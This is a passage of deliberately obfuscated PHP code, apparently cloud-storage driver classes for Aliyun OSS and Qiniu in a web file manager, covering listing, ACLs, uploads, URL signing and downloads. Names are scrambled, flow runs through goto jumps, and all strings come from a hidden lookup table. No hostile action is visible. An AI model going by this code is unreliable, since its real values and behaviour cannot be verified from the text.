} if (isset($cõçÆêÏÜ[$A’Óùø¯Ö×[202]])) { $E­áÉõÀù[$A’Óùø¯Ö×[202]] = $cõçÆêÏÜ[$A’Óùø¯Ö×[202]]; } return $E­áÉõÀù; goto fÌœâİà¼Á; fÌœâİà¼Á: } public function listPath($c±¨«´—ô, $bâ¥—”½»… = false) { $Fäßš¨ê– =& $_SERVER[¾÷]; $cÂ¶íÅõá‹ = $this->fileList($c±¨«´—ô, $Fäßš¨ê–[18], !0); foreach ($cÂ¶íÅõá‹[$Fäßš¨ê–[84]] as $Aì½ÊóË => $e¸×¯µ®óë) { $cÂ¶íÅõá‹[$Fäßš¨ê–[84]][$Aì½ÊóË] = $this->folderInfo($e¸×¯µ®óë, $bâ¥—”½»…, $e¸×¯µ®óë); } foreach ($cÂ¶íÅõá‹[$Fäßš¨ê–[83]] as $Aì½ÊóË => $e¸×¯µ®óë) { $cÂ¶íÅõá‹[$Fäßš¨ê–[83]][$Aì½ÊóË] = $this->fileInfo($e¸×¯µ®óë[$Fäßš¨ê–[38]], $bâ¥—”½»…, $e¸×¯µ®óë); } return $cÂ¶íÅõá‹; } public function has($A³‘‹å»¤, $a¯Ç©Â’ù° = false, $b˜º±³¶‚á = true) { goto D‘­…‚íš; féÒ¿ŞŠÇ: while (!0) { check_abort(); $B´××š·Û‘ = array($EãÔÅ ¡Ó²[1246] => $EãÔÅ ¡Ó²[18], $EãÔÅ ¡Ó²[1247] => $CÄä²‚³, $EãÔÅ ¡Ó²[1248] => $dåù©Îºİ˜, $EãÔÅ ¡Ó²[1249] => $dÙ×ƒí­¦õ); try { $bÖáÉ¸„É = $this->client->listObjects($this->bucket, $B´××š·Û‘); } catch (OSS\Core\OssException $dÅä›ˆŒ) { break; } $dÙ×ƒí­¦õ = $bÖáÉ¸„É->getNextMarker(); $f®„øœªƒ¬ = $bÖáÉ¸„É->getObjectList(); $Eº™È¥‡ˆ– = $bÖáÉ¸„É->getPrefixList(); if ($a¯Ç©Â’ù°) { if (count($f®„øœªƒ¬) > 1 || count($f®„øœªƒ¬) == 1 && $f®„øœªƒ¬[0]->getKey() != $CÄä²‚³) { $FŒÔÕÚ‚ª += count($f®„øœªƒ¬) - 1; } if (!empty($Eº™È¥‡ˆ–)) { $FßÙº÷Àğ += count($Eº™È¥‡ˆ–); } if ($dÙ×ƒí­¦õ === $EãÔÅ ¡Ó²[43]) { break; } continue; } if ($b˜º±³¶‚á) { if (!empty($f®„øœªƒ¬)) { if (count($f®„øœªƒ¬) > 1 || $f®„øœªƒ¬[0]->getKey() != $CÄä²‚³) { return !0; } } } else { if (!empty($Eº™È¥‡ˆ–)) { return !0; } } if ($dÙ×ƒí­¦õ === $EãÔÅ ¡Ó²[43]) { break; } } if ($a¯Ç©Â’ù°) { return array($EãÔÅ ¡Ó²[211] => $FŒÔÕÚ‚ª, $EãÔÅ ¡Ó²[212] => $FßÙº÷Àğ); } return !1; goto e´¬¿¦¼ºÒ; DÆßï‡À¸è: $dÙ×ƒí­¦õ = $EãÔÅ ¡Ó²[43]; $dåù©Îºİ˜ = 500; $FŒÔÕÚ‚ª = $FßÙº÷Àğ = 0; goto féÒ¿ŞŠÇ; D‘­…‚íš: $EãÔÅ ¡Ó² =& $_SERVER[¾÷]; $A³‘‹å»¤ = trim($A³‘‹å»¤, $EãÔÅ ¡Ó²[18]); $CÄä²‚³ = empty($A³‘‹å»¤) ? $EãÔÅ ¡Ó²[43] : $A³‘‹å»¤ . $EãÔÅ ¡Ó²[18]; goto DÆßï‡À¸è; e´¬¿¦¼ºÒ: } public function listAll($bµÓéŒ†Â±) { $d²êÆ–ÃáÊ =& $_SERVER[¾÷]; $AÉÀÈ«ÑÜº = $this->fileList($bµÓéŒ†Â±, $d²êÆ–ÃáÊ[43], !0); $A‘âºŞ½á = array(); foreach ($AÉÀÈ«ÑÜº[$d²êÆ–ÃáÊ[83]] as $B›£¬Ó™ßÅ) { $A‘âºŞ½á[$B›£¬Ó™ßÅ[$d²êÆ–ÃáÊ[38]]] = $B›£¬Ó™ßÅ[$d²êÆ–ÃáÊ[87]]; } foreach ($AÉÀÈ«ÑÜº[$d²êÆ–ÃáÊ[84]] as $B›£¬Ó™ßÅ) { if (is_string($B›£¬Ó™ßÅ)) { $A‘âºŞ½á[$B›£¬Ó™ßÅ] = 0; } } return $this->listAllFiles($bµÓéŒ†Â±, array_keys($A‘âºŞ½á), $A‘âºŞ½á); } public function canRead($CÊèÙà†Ï) { $CñË¸ƒöØÖ =& $_SERVER[¾÷]; $f±Â™ê˜äâ = $this->pathAcl($CÊèÙà†Ï); return $f±Â™ê˜äâ == $CñË¸ƒöØÖ[1260] || $f±Â™ê˜äâ == $CñË¸ƒöØÖ[523] ? !0 : !1; } public function canWrite($A¹µÌ¼Ÿ°Ë) { $d¡ùŞ†…ÎÆ = $this->pathAcl($A¹µÌ¼Ÿ°Ë); return $d¡ùŞ†…ÎÆ == $_SERVER[¾÷][523] ? !0 : !1; } public function pathAcl($e¿ Áóéä) { goto b¬«‘˜ì¢ª; b¬«‘˜ì¢ª: $f¥µ•øòŒ´ =& $_SERVER[¾÷]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $CÚ¡˜¼´¯Ô = $this->client->getObjectAcl($this->bucket, $this->pathEncode($e¿ Áóéä)); } catch (OSS\Core\OssException $dÒù‹½‘”·) { return !1; } goto aà–Ôë›¸; CËÃ”ÂİƒÂ: return $Aˆ­ïÁÌï; goto EØÑÏ¼¥Û; aà–Ôë›¸: $Aˆ­ïÁÌï = $CÚ¡˜¼´¯Ô == $f¥µ•øòŒ´[44] ? $this->bucketAcl : $CÚ¡˜¼´¯Ô; if ($Aˆ­ïÁÌï == $f¥µ•øòŒ´[1261]) { return $f¥µ•øòŒ´[1260]; } if ($Aˆ­ïÁÌï == $f¥µ•øòŒ´[1262]) { return $f¥µ•øòŒ´[523]; } goto CËÃ”ÂİƒÂ; EØÑÏ¼¥Û: } private function chmodPath($a”‚¶èî–, $cæÔ¥×¯ŠŞ = '') { $d¤ÑêÜĞ© =& $_SERVER[¾÷]; $BØºÃºÒ = empty($cæÔ¥×¯ŠŞ) ? $d¤ÑêÜĞ©[1262] : $cæÔ¥×¯ŠŞ; $C‚½ô°–¨— = array($d¤ÑêÜĞ©[44], $d¤ÑêÜĞ©[200], $d¤ÑêÜĞ©[1261], $d¤ÑêÜĞ©[1262]); if (!in_array($BØºÃºÒ, $C‚½ô°–¨—)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($a”‚¶èî–), $BØºÃºÒ); } catch (OSS\Core\OssException $f„×İÍ¥ªº) { return !1; } return !0; } public function getContent($F‡â½‡˜ó) { return $this->fileSubstr($F‡â½‡˜ó, -1); } public function setContent($bôå¢ãî‹ø, $Cê¿¯×âÚ„ = '') { $C‰ÅÎèÁŸ† =& $_SERVER[¾÷]; try { $D×„ãôÀ‘… = $this->trafficLimit($C‰ÅÎèÁŸ†[1263]); $C¡ïá¥•Œ = $this->client->putObject($this->bucket, $this->pathEncode($bôå¢ãî‹ø), $Cê¿¯×âÚ„, $D×„ãôÀ‘…); } catch (OSS\Core\OssException $BëÄì¬§‘ø) { return !1; } $A¹›Ú ¿Ô = array($C‰ÅÎèÁŸ†[1252] => trim($C¡ïá¥•Œ[$C‰ÅÎèÁŸ†[1264]], $C‰ÅÎèÁŸ†[125]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($bôå¢ãî‹ø))); $this->updateObjMeta($bôå¢ãî‹ø, $A¹›Ú ¿Ô); return isset($C¡ïá¥•Œ[$C‰ÅÎèÁŸ†[1265]][$C‰ÅÎèÁŸ†[1211]]) ? !0 : !1; } private function updateObjMeta($Cƒ­ ÆÍóê, $A¦¸Š™‰â©) { $Cƒ­ ÆÍóê = $this->pathEncode($Cƒ­ ÆÍóê); try { $cøø×…ô = array(OSS\OssClient::OSS_HEADERS => $A¦¸Š™‰â©); $this->client->copyObject($this->bucket, $Cƒ­ ÆÍóê, $this->bucket, $Cƒ­ ÆÍóê, $cøø×…ô); } catch (OSS\Core\OssException $DóÔ©¡—‹Ô) { return !1; } return !0; } public function upload($d„§ïØŞœ, $aœ³¢‚Øç‚, $cé°Û´Á¡ù = false, $A…ƒäğ…Òò = REPEAT_REPLACE) { $eËÉÊåÜ„ò =& $_SERVER[¾÷]; $AË¦êË¼í© = trim($d„§ïØŞœ, $eËÉÊåÜ„ò[18]); $A£ºĞÚ‹ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($eËÉÊåÜ„ò[1252] => @md5_file($aœ³¢‚Øç‚)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($d„§ïØŞœ))); $A£ºĞÚ‹ = $this->trafficLimit($eËÉÊåÜ„ò[1263], $A£ºĞÚ‹); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($AË¦êË¼í©), $aœ³¢‚Øç‚, $A£ºĞÚ‹); } catch (OSS\Core\OssException $Bïæ˜«µ™) { return !1; } return $this->getPathOuter($d„§ïØŞœ); } public function getHost() { $e×›“ñ©ËÒ =& $_SERVER[¾÷]; $aã š¶§ƒ = explode($e×›“ñ©ËÒ[186], parent::getHost()); return $aã š¶§ƒ[0] . $e×›“ñ©ËÒ[186] . $this->bucket . $e×›“ñ©ËÒ[104] . $aã š¶§ƒ[1]; } public function uploadFormData($F“´ªÓ½†Ü, $cé†—Ç¹æ = 3600) { goto e°•Ü¶¦õ; bù¯½À¹¹¤: return $d¸àëÇÎùñ; goto b²¥–±ù±Ê; fî¦Œñ³Ğ“: $f‡ëÄ‡îİõ = base64_encode(hash_hmac($cÏ†ØÃÇš­[237], $A½—¶‘É©, $this->secret, !0)); $d¸àëÇÎùñ = array($cÏ†ØÃÇš­[1175] => $A½—¶‘É©, $cÏ†ØÃÇš­[1269] => $this->accessKey, $cÏ†ØÃÇš­[1171] => $cÏ†ØÃÇš­[1163], $cÏ†ØÃÇš­[1270] => $f‡ëÄ‡îİõ, $cÏ†ØÃÇš­[184] => $fÕÂ—Ê¤Î); $d¸àëÇÎùñ = $this->trafficLimit($cÏ†ØÃÇš­[1263], $d¸àëÇÎùñ); goto bù¯½À¹¹¤; e°•Ü¶¦õ: $cÏ†ØÃÇš­ =& $_SERVER[¾÷]; if (!($fÕÂ—Ê¤Î = $this->getHost())) { return !1; } $D–ÅõÎî‰ = $cé†—Ç¹æ; goto bµ÷êÓó; bµ÷êÓó: $dÖ­¨ê¢ = date($cÏ†ØÃÇš­[1266], time() + $D–ÅõÎî‰); $Eå½ÁÜˆÁ = new DateTime($dÖ­¨ê¢); $EãÁ›ô¢  = $Eå½ÁÜˆÁ->format(DateTime::ISO8601); goto c®Òîè°¥“; c®Òîè°¥“: $Aà¥˜¹ø¡ = strpos($EãÁ›ô¢ , $cÏ†ØÃÇš­[301]); $EãÁ›ô¢  = substr($EãÁ›ô¢ , 0, $Aà¥˜¹ø¡) . $cÏ†ØÃÇš­[1267]; $fñ„ğòŞ†• = 1048576000 * 5; goto dÓãÚŠ‰¼›; dÓãÚŠ‰¼›: $e‚Õ‚¿×ÇÊ = $this->pathFather($F“´ªÓ½†Ü); $FÒÕˆÚÄ…Ç = array($cÏ†ØÃÇš­[1165] => $EãÁ›ô¢ , $cÏ†ØÃÇš­[1166] => array(array($cÏ†ØÃÇš­[1268], 0, $fñ„ğòŞ†•), array($cÏ†ØÃÇš­[1169], $cÏ†ØÃÇš­[1170], $e‚Õ‚¿×ÇÊ))); $A½—¶‘É© = base64_encode(json_encode($FÒÕˆÚÄ…Ç)); goto fî¦Œñ³Ğ“; b²¥–±ù±Ê: } public function multiUploadFormData($Dò·ˆâìÏë, $Eé·˜‰¬³ = 3600) { $B„ƒÔäôº =& $_SERVER[¾÷]; if (!($f Ã¨„¹³Ù = $this->getHost())) { return !1; } $dÑ£ªÛ‚èŒ = $this->trafficLimit($B„ƒÔäôº[1263]); $C‘¯ôÂä¶ß = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Dò·ˆâìÏë), $dÑ£ªÛ‚èŒ); return array($B„ƒÔäôº[229] => $C‘¯ôÂä¶ß, $B„ƒÔäôº[184] => $f Ã¨„¹³Ù . $B„ƒÔäôº[18] . $this->pathEncode($Dò·ˆâìÏë), $B„ƒÔäôº[230] => gmdate($B„ƒÔäôº[1271]), $B„ƒÔäôº[102] => $Dò·ˆâìÏë); } public function multiUploadAuthData($E„®‰²¤Ûƒ, $DÚ¾‡®¡ò‰ = array()) { goto E×ìî‡ŠÎ; E×ìî‡ŠÎ: $aÑÖÄøãÆÙ =& $_SERVER[¾÷]; $AÆÃ¸‹Şì = isset($DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[230]]) ? $DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[230]] : gmdate($aÑÖÄøãÆÙ[1271]); $eõ®áÊ½ø¶ = isset($DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[177]]) ? $DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[177]] : $aÑÖÄøãÆÙ[43]; goto D·ì•İç™Õ; D·ì•İç™Õ: $F‘‘Ç‘ßë‡ = $E„®‰²¤Ûƒ; if (isset($DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[102]])) { $F‘‘Ç‘ßë‡ = $DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[102]]; unset($DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[102]]); } if (isset($DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[231]])) { $DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[230]] = $AÆÃ¸‹Şì; return $this->listUploadParts($F‘‘Ç‘ßë‡, $DÚ¾‡®¡ò‰); } goto c§šÃÁë¸¸; c§šÃÁë¸¸: $B»®É‘ò„ = array($aÑÖÄøãÆÙ[232], $aÑÖÄøãÆÙ[43], $aÑÖÄøãÆÙ[128], $AÆÃ¸‹Şì, "\x78\55\157\163\x73\55\144\141\164\x65\x3a{$AÆÃ¸‹Şì}", $aÑÖÄøãÆÙ[18] . $this->bucket . $aÑÖÄøãÆÙ[18] . $F‘‘Ç‘ßë‡ . $eõ®áÊ½ø¶); if (strpos($eõ®áÊ½ø¶, $aÑÖÄøãÆÙ[233]) === 0) { $B»®É‘ò„[0] = $aÑÖÄøãÆÙ[234]; if ($AŸ¨ˆŠÙìÙ = $this->trafficLimit($aÑÖÄøãÆÙ[1263])) { $F‘‘Ç‘ßë‡ = $aÑÖÄøãÆÙ[1272]; array_splice($B»®É‘ò„, 5, 0, $F‘‘Ç‘ßë‡ . $aÑÖÄøãÆÙ[14] . $AŸ¨ˆŠÙìÙ[$F‘‘Ç‘ßë‡]); } } if (isset($DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[235]]) && $DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[235]] == $aÑÖÄøãÆÙ[236]) { $B»®É‘ò„[0] = $aÑÖÄøãÆÙ[236]; } goto d‰¨Û›Ï”•; c›´ŠÛÜÑš: $Dª¢Œ½õõ = $aÑÖÄøãÆÙ[1236] . $this->accessKey . $aÑÖÄøãÆÙ[14] . $dÉâò×¡‡¥; if (strpos($eõ®áÊ½ø¶, $aÑÖÄøãÆÙ[233]) === 0) { $Dª¢Œ½õõ = array($aÑÖÄøãÆÙ[239] => $Dª¢Œ½õõ, $aÑÖÄøãÆÙ[230] => $AÆÃ¸‹Şì); if ($AŸ¨ˆŠÙìÙ) { $Dª¢Œ½õõ = array_merge($Dª¢Œ½õõ, $AŸ¨ˆŠÙìÙ); } } return $Dª¢Œ½õõ; goto E¸ì¦Æ‘¢–; d‰¨Û›Ï”•: if (!empty($DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[1273]])) { $Eˆ„¨øñÅÊ = array_merge(array($B»®É‘ò„[4]), $DÚ¾‡®¡ò‰[$aÑÖÄøãÆÙ[1273]]); sort($Eˆ„¨øñÅÊ); $B»®É‘ò„[4] = implode($aÑÖÄøãÆÙ[9], $Eˆ„¨øñÅÊ); } $B´†øî«Êó = implode($aÑÖÄøãÆÙ[9], $B»®É‘ò„); $dÉâò×¡‡¥ = base64_encode(hash_hmac($aÑÖÄøãÆÙ[237], $B´†øî«Êó, $this->secret, !0)); goto c›´ŠÛÜÑš; E¸ì¦Æ‘¢–: } public function listUploadParts($B–›§„¹Ìó, $C¦®»Í˜øĞ) { goto B±”å¡ëå·; B±”å¡ëå·: $eİŠ ‹• =& $_SERVER[¾÷]; $F¬’ŠÒß© = parse_url_query($C¦®»Í˜øĞ[$eİŠ ‹•[177]]); $b®¦¸†ìÖ· = $this->client->listParts($this->bucket, $this->pathEncode($B–›§„¹Ìó), $F¬’ŠÒß©[$eİŠ ‹•[229]]); goto d¨Áç‰×©Ù; CßË™ÌÊ’î: return array($eİŠ ‹•[239] => $Fš•Šë ÌÎ, $eİŠ ‹•[230] => $C¦®»Í˜øĞ[$eİŠ ‹•[230]], $eİŠ ‹•[241] => $a·˜õò±±›); goto d‰µã½¾; d¨Áç‰×©Ù: $CÉŠé’ÓĞƒ = $b®¦¸†ìÖ·->getListPart(); $a·˜õò±±› = array(); foreach ($CÉŠé’ÓĞƒ as $f¬®Å°×¬ù) { $a·˜õò±±›[] = array($eİŠ ‹•[1256] => $f¬®Å°×¬ù->getPartNumber(), $eİŠ ‹•[1257] => trim($f¬®Å°×¬ù->getETag(), $eİŠ ‹•[125])); } goto E½à‰îĞÌ•; E½à‰îĞÌ•: unset($C¦®»Í˜øĞ[$eİŠ ‹•[231]], $C¦®»Í˜øĞ[$eİŠ ‹•[235]]); $Fš•Šë ÌÎ = $this->multiUploadAuthData($B–›§„¹Ìó, $C¦®»Í˜øĞ); if (empty($Fš•Šë ÌÎ)) { return !1; } goto CßË™ÌÊ’î; d‰µã½¾: } public function download($eõ­»…¤²õ, $fÄËÂ´Ì¦Ò) { if ($this->isFolder($eõ­»…¤²õ)) { return !1; } try { $fÎõ¤Œ¥´ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $fÄËÂ´Ì¦Ò); $fÎõ¤Œ¥´ = $this->trafficLimit($_SERVER[¾÷][118], $fÎõ¤Œ¥´); $this->client->getObject($this->bucket, $this->pathEncode($eõ­»…¤²õ), $fÎõ¤Œ¥´); } catch (OSS\Core\OssException $c±õ·¹“Õñ) { return !1; } return $fÄËÂ´Ì¦Ò; } public function fileSubstr($bÜÁ‡ğ§·İ, $fªŠµåéÁ = 0, $C­º…‹÷õ = false) { if ($fªŠµåéÁ === -1) { $D—‹‹µ¬³Š = array(); } else { if ($C­º…‹÷õ === !1) { $c…ìà‰ºÆ = $this->size($bÜÁ‡ğ§·İ); } else { $c…ìà‰ºÆ = $fªŠµåéÁ + $C­º…‹÷õ - 1; } $D—‹‹µ¬³Š = array(OSS\OssClient::OSS_RANGE => "{$fªŠµåéÁ}\x2d{$c…ìà‰ºÆ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($bÜÁ‡ğ§·İ), $D—‹‹µ¬³Š); } catch (OSS\Core\OssException $E…ñÛŸÙ÷•) { think_exception($E…ñÛŸÙ÷•->getMessage()); return !1; } } private function trafficLimit($D‰µâÊõŸİ, $BÀÉ¬‚–ƒ¯ = array()) { goto EƒÈòğƒÁÌ; A©âåà˜á: return $BÀÉ¬‚–ƒ¯; goto EŞĞá­Å¬; EƒÈòğƒÁÌ: $a™œâª¤à» =& $_SERVER[¾÷]; if ($D‰µâÊõŸİ == $a™œâª¤à»[1263] && $this->isUploadServer() || $D‰µâÊõŸİ == $a™œâª¤à»[118] && $this->isFileOutServer()) { return $BÀÉ¬‚–ƒ¯; } $a©¨ˆŸñ¢ = floatval($GLOBALS[$a™œâª¤à»[16]][$a™œâª¤à»[97]][$a™œâª¤à»[116]][$D‰µâÊõŸİ]) * 1024 * 1024 * 8; goto AŞ¹‡Äï‰ß; AŞ¹‡Äï‰ß: if (!$a©¨ˆŸñ¢) { return $BÀÉ¬‚–ƒ¯; } $a©¨ˆŸñ¢ = $a©¨ˆŸñ¢ < 819200 ? 819200 : ($a©¨ˆŸñ¢ > 838860800 ? 838860800 : $a©¨ˆŸñ¢); $BÀÉ¬‚–ƒ¯[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($a©¨ˆŸñ¢); goto A©âåà˜á; EŞĞá­Å¬: } public function link($FªîØ„Ÿ“«, $F‡ÊÒßØŒù = array()) { $Bõø’îÌ“Ô =& $_SERVER[¾÷]; if (!$this->exist($FªîØ„Ÿ“«) || $this->isFolder($FªîØ„Ÿ“«)) { return !1; } try { $F‡ÊÒßØŒù = $this->trafficLimit($Bõø’îÌ“Ô[118], $F‡ÊÒßØŒù); $e“á”øƒ = $this->client->signUrl($this->bucket, $this->pathEncode($FªîØ„Ÿ“«), 3600 * 12, $Bõø’îÌ“Ô[236], $F‡ÊÒßØŒù); return $this->getCdnLink($e“á”øƒ); } catch (OSS\Core\OssException $aÔš–ˆ†ª·) { return !1; } } public function fileOut($eíŞÍ‰£¸æ, $A©¥ğ“Ô˜ = false, $AÆ†ğ±Ô = false, $Bòù“Îá­œ = '') { goto d“øÄ«‰Ñ; D–ìÌïÙœé: $A©¥ğ“Ô˜ = $A©¥ğ“Ô˜ ? $FÜ…ùŸ¼Ø©[222] : $FÜ…ùŸ¼Ø©[223]; $dÕ·®©š‡ = array(OSS\OssClient::OSS_SUB_RESOURCE => $FÜ…ùŸ¼Ø©[1274] . rawurlencode("{$A©¥ğ“Ô˜}\73\146\151\x6c\x65\x6e\141\x6d\x65\75{$AÆ†ğ±Ô}")); $dÕ·®©š‡[OSS\OssClient::OSS_SUB_RESOURCE] .= $FÜ…ùŸ¼Ø©[1275] . rawurlencode($E¹…‹Ö¼“ë); goto BùÕ”œ¼±; d“øÄ«‰Ñ: $FÜ…ùŸ¼Ø© =& $_SERVER[¾÷]; if ($this->isFileOutServer()) { return $this->fileOutServer($eíŞÍ‰£¸æ, $A©¥ğ“Ô˜, $AÆ†ğ±Ô, $Bòù“Îá­œ); } if (!$AÆ†ğ±Ô) { $AÆ†ğ±Ô = $this->pathThis($eíŞÍ‰£¸æ); } goto f›ªæÂÁñÏ; f›ªæÂÁñÏ: $AÆ†ğ±Ô = rawurlencode($AÆ†ğ±Ô); $E¹…‹Ö¼“ë = get_file_mime(get_path_ext($AÆ†ğ±Ô)); if ($E¹…‹Ö¼“ë == $FÜ…ùŸ¼Ø©[221]) { return parent::fileOut($eíŞÍ‰£¸æ, $A©¥ğ“Ô˜, $AÆ†ğ±Ô, $Bòù“Îá­œ); } goto D–ìÌïÙœé; BùÕ”œ¼±: $eñ¼„š¤¤ = $this->link($eíŞÍ‰£¸æ, $dÕ·®©š‡); $this->fileOutLink($eñ¼„š¤¤); goto bÄŠÒñÖä“; bÄŠÒñÖä“: } public function fileOutServer($B‹—ä¬ Ã“, $eˆ·„¥³Ï» = false, $d±Æ‡è²Å¼ = false, $d¤Ş¢ŠƒÈ = '') { parent::fileOut($B‹—ä¬ Ã“, $eˆ·„¥³Ï», $d±Æ‡è²Å¼, $d¤Ş¢ŠƒÈ); } public function fileOutImage($dÜ†àË…ß, $BÉ‚£Ç‚Ä± = 250) { $E¤·ƒ“ƒ¿™ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¾÷][1276] . $BÉ‚£Ç‚Ä±); $CŞÃ±Ïµøá = $this->link($dÜ†àË…ß, $E¤·ƒ“ƒ¿™); $this->fileOutLink($CŞÃ±Ïµøá); } public function fileOutImageServer($BˆÙ§¿¥É´, $e²Ğ¤±ÜŒ™ = 250) { parent::fileOutImage($BˆÙ§¿¥É´, $e²Ğ¤±ÜŒ™); } public function fileOutLink($c…Ö’ŠæÂ) { $EËŒ»‡•ç =& $_SERVER[¾÷]; if (!$this->isCdnHost() && substr($c…Ö’ŠæÂ, 0, 7) == $EËŒ»‡•ç[1178]) { $c…Ö’ŠæÂ = $EËŒ»‡•ç[1179] . substr($c…Ö’ŠæÂ, 7); } header($EËŒ»‡•ç[168] . $c…Ö’ŠæÂ); die; } public function hashMd5($dº©Ë³å¶¿, $a¨ôÉÑ© = '') { $a´å§¨¼–¥ =& $_SERVER[¾÷]; $D®™„íãÁ… = $this->_objectMeta($dº©Ë³å¶¿); if (!$D®™„íãÁ…) { return $a´å§¨¼–¥[43]; } if (!isset($D®™„íãÁ…[$a´å§¨¼–¥[1252]]) && !empty($a¨ôÉÑ©)) { $e”¡â”ÙÂƒ = $this->updateObjMeta($dº©Ë³å¶¿, array($a´å§¨¼–¥[1252] => $a¨ôÉÑ©)); $D®™„íãÁ…[$a´å§¨¼–¥[1252]] = $e”¡â”ÙÂƒ ? $a¨ôÉÑ© : $a´å§¨¼–¥[43]; } return isset($D®™„íãÁ…[$a´å§¨¼–¥[1252]]) ? strtolower($D®™„íãÁ…[$a´å§¨¼–¥[1252]]) : $a´å§¨¼–¥[43]; } public function size($eùŸê·ƒî) { $E‹í°ßõÈŸ = $this->objectMeta($eùŸê·ƒî); return $E‹í°ßõÈŸ ? $E‹í°ßõÈŸ[$_SERVER[¾÷][87]] : 0; } public function info($fø»ï‰À”ß) { if ($this->isFolder($fø»ï‰À”ß)) { return $this->folderInfo($fø»ï‰À”ß); } else { if ($this->isFile($fø»ï‰À”ß)) { return $this->fileInfo($fø»ï‰À”ß); } } return !1; } public function exist($bœ«âòâ“®) { return $this->isFile($bœ«âòâ“®) || $this->isFolder($bœ«âòâ“®); } public function isFile($c‚†ê«ØÛÊ) { return !$this->isFolder($c‚†ê«ØÛÊ) && $this->objectMeta($c‚†ê«ØÛÊ); } public function isFolder($c±ê—§‚ÌĞ) { return $this->cacheMethod($_SERVER[¾÷][207], $c±ê—§‚ÌĞ); } protected function objectMeta($d‡‘æ±†³) { return $this->cacheMethod($_SERVER[¾÷][208], $d‡‘æ±†³); } protected function _objectMeta($d¶ÀĞ’ÛˆĞ) { $cóˆ°µÓÑ„ =& $_SERVER[¾÷]; try { $aÈ¶Äƒ‹µ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($d¶ÀĞ’ÛˆĞ)); } catch (OSS\Core\OssException $d‘ÑÜ¶Ë¡ó) { $aÈ¶Äƒ‹µ = !1; } if ($aÈ¶Äƒ‹µ) { $aÈ¶Äƒ‹µ[$cóˆ°µÓÑ„[87]] = intval($aÈ¶Äƒ‹µ[$cóˆ°µÓÑ„[1250]]); } return $aÈ¶Äƒ‹µ; } protected function _isFolder($aê¥“»˜Á«) { $EÚ¹Í¶á =& $_SERVER[¾÷]; if ($aê¥“»˜Á« == $EÚ¹Í¶á[43] || $aê¥“»˜Á« == $EÚ¹Í¶á[18]) { return !0; } $dà¢õÚä¢ = array($EÚ¹Í¶á[1246] => $EÚ¹Í¶á[18], $EÚ¹Í¶á[1247] => rtrim($aê¥“»˜Á«, $EÚ¹Í¶á[18]) . $EÚ¹Í¶á[18], $EÚ¹Í¶á[1248] => 1, $EÚ¹Í¶á[1249] => $EÚ¹Í¶á[43]); $bà³ÁÖŠ› = $this->client->listObjects($this->bucket, $dà¢õÚä¢); if ($bà³ÁÖŠ›->getObjectList() || $bà³ÁÖŠ›->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($F¾×Á«) { parent::__construct(); require_once SDK_DIR . $_SERVER[¾÷][1277]; $this->_init($F¾×Á«); } public function _init($E²æ‹À· ) { goto DŞšĞ»´¥à; DŞšĞ»´¥à: $BË­‡íßÒê =& $_SERVER[¾÷]; foreach ($E²æ‹À·  as $Fğ¬á‡ÉÔ => $eã×‚¤Á¹ä) { if (isset($this->{$Fğ¬á‡ÉÔ})) { $this->{$Fğ¬á‡ÉÔ} = $eã×‚¤Á¹ä; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($BË­‡íßÒê[1278] . LNG($BË­‡íßÒê[1237])); } goto FÁ‹Ğçº˜; FÁ‹Ğçº˜: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto dˆ—ãóšê¾; dˆ—ãóšê¾: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto c¥Ô„£™Ø; c¥Ô„£™Ø: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($A³±ó¦£ï, $fêîÆÏÚùŠ = '', $c“‹ìë±ìÈ = REPEAT_RENAME) { if ($this->setContent($A³±ó¦£ï, $fêîÆÏÚùŠ)) { return $this->getPathOuter($A³±ó¦£ï); } return !1; } public function mkdir($Dñç’â§…é, $eòàÒÅêù™ = REPEAT_SKIP) { goto D÷ëõ·å±; fåÇ¯ÈØ ™: if (!$this->mkfile($EŠˆ‡ß‡š)) { return !1; } if (!$this->moveFile($EŠˆ‡ß‡š, $Dñç’â§…é)) { $this->delFile($EŠˆ‡ß‡š); return !1; } return $this->getPathOuter($bª°•Å»‰®); goto dô§æõ¥Ò­; e«ÂùŒ‹‚‡: $Dñç’â§…é = $bª°•Å»‰® . $cĞŞ• ËŞ‡[18]; $bÈƒ‹“ğÑâ = get_path_this($bª°•Å»‰®); $EŠˆ‡ß‡š = $Dñç’â§…é . $bÈƒ‹“ğÑâ; goto fåÇ¯ÈØ ™; D÷ëõ·å±: $cĞŞ• ËŞ‡ 